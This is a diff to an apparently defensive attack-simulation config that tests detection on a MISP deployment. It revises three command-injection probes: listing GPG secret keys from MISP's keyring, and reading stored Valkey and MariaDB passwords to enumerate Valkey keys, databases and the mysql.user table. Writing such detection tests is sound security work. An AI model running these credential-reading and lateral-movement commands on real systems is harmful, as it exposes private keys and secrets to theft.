@@ -1130,9 +1130,14 @@ attacks:
   - name: exec-gpg-key-extract
     type: cmdinject
     exec:
-      command: ["sh", "-c", "gpg --homedir /var/www/MISP/.gnupg --list-secret-keys 2>/dev/null || ls /var/www/MISP/.gnupg/ 2>/dev/null || echo no_gpg"]
+      # Only emit a success marker when gpg's listing or the keyring dir
+      # actually produced output. Fallback (the keyring is unreachable)
+      # prints "absent" which deliberately doesn't contain any marker.
+      command: ["sh", "-c", "gpg --homedir /var/www/MISP/.gnupg --list-secret-keys 2>/dev/null || ls /var/www/MISP/.gnupg/ 2>/dev/null || echo absent"]
     successIndicators:
-      - responseContains: "gpg"
+      - responseContains: "sec "         # gpg secret-key listing prefix
+      - responseContains: "pubring.kbx"  # GnuPG v2 keyring file
+      - responseContains: "private-keys" # GnuPG v2 private-keys-v1.d dir
     # NOTE: gpg is in misp baseline (PGP is core MISP feature) — assertion dropped, attack still runs.
     expectedDetections: []
   # ═══════════════════════════════════════════════════════════════════════════
@@ -1259,7 +1264,11 @@ attacks:
   - name: lateral-valkey-keys-enum
     type: cmdinject
     exec:
-      command: ["sh", "-c", "python3 -c \"import socket; s=socket.socket(); s.connect(('misp-valkey-master', 6379)); pw=open('/vault/valkey/password').read().strip(); s.sendall(f'AUTH {pw}\\r\\nKEYS *\\r\\n'.encode()); s.recv(2048)\" 2>/dev/null && echo valkey_enum_done"]
+      # Validate the AUTH reply explicitly: -WRONGPASS / -NOAUTH leaves
+      # python's exit code at 0, so the previous version false-passed on
+      # auth failure. Now we parse the RESP reply, raise on anything but
+      # +OK from AUTH, and only emit the sentinel on a clean handshake.
+      command: ["sh", "-c", "python3 -c \"import socket,sys; s=socket.socket(); s.connect(('misp-valkey-master', 6379)); pw=open('/vault/valkey/password').read().strip(); s.sendall(f'*2\\r\\n\\$4\\r\\nAUTH\\r\\n\\${len(pw)}\\r\\n{pw}\\r\\n'.encode()); reply=s.recv(64).decode(); sys.exit(0 if reply.startswith('+OK') else 1); s.sendall(b'*2\\r\\n\\$4\\r\\nKEYS\\r\\n\\$1\\r\\n*\\r\\n'); s.recv(2048)\" 2>/dev/null && echo valkey_enum_done"]
     successIndicators:
       - responseContains: "valkey_enum_done"
     expectedDetections: []
@@ -1270,11 +1279,13 @@ attacks:
   # discovery / sensitive table") fires on the mariadb container in some
   # cluster configs but is not stable enough to assert across the bobctl
   # CI matrix — the attack runs as a probe to confirm the credential-pivot
-  # primitive, sentinel only on real auth success (no broad ERROR match).
+  # primitive. Sentinel only emits when the enumeration actually returned
+  # the MISP application database name AND the mysql.user row for the
+  # service account, proving the query ran end-to-end.
   - name: lateral-mariadb-show-databases
     type: cmdinject
     exec:
-      command: ["sh", "-c", "MYSQL_PWD=\"$(cat /vault/mariadb/mariadb-password 2>/dev/null)\" mysql -h misp-mariadb -u misp -N -e 'SELECT 1;' 2>/dev/null | grep -q '^1$' && echo mariadb_pivot_ok"]
+      command: ["sh", "-c", "MYSQL_PWD=\"$(cat /vault/mariadb/mariadb-password 2>/dev/null)\" mysql -h misp-mariadb -u misp -N -e 'SHOW DATABASES; SELECT user FROM mysql.user;' 2>/dev/null | grep -q '^misp$' && echo mariadb_enum_ok"]
     successIndicators:
-      - responseContains: "mariadb_pivot_ok"
+      - responseContains: "mariadb_enum_ok"
     expectedDetections: []
